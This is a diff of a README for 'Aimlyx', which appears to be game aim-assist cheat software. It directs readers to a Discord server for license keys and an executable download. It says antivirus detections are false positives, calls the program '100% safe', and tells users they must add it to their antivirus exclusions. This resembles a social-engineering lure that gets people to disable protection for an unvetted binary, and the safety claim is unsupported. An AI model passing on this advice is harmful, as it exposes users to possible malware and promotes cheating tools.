@@ -40,7 +40,7 @@ Our architecture utilizes a **Unified Build System**. This means that both Free 
 To download the latest official release and obtain your access key, follow these steps:
 
 1.  **Join the Community:** Click the link below to enter our official Discord server.
-    👉 **[Join the Aimlyx Discord Server (Code: QZPxFV5839)](https://discord.gg/QZPxFV5839)** 👈
+    👉 **[Join the Aimlyx Discord Server](https://discord.gg/QZPxFV5839)** 👈
 2.  **Get Your Key:** Standard features are free! If you want to unlock advanced humanization and profile saving, grab a custom license key inside the server.
 3.  **Run the Software:** Download the unified executable from our `#🚀│releases` channel, load your settings, and enjoy!
 
@@ -51,7 +51,7 @@ To download the latest official release and obtain your access key, follow these
 Because Aimlyx uses low-level Windows API hooking libraries to manage humanized mouse movements, some antivirus programs and **Windows Defender** may flag the compiled executable as a false positive. 
 
 *   **Is it safe?** Yes, 100%. The software contains no malicious code.
-*   **How to solve this?** You must add the executable file or its containing folder to your antivirus exclusions list to prevent Windows from blocking or deleting it. 💀
+*   **How to solve this?** You must add the executable file or its containing folder to your antivirus exclusions list to prevent Windows from blocking or deleting it. 
 
 ---
 
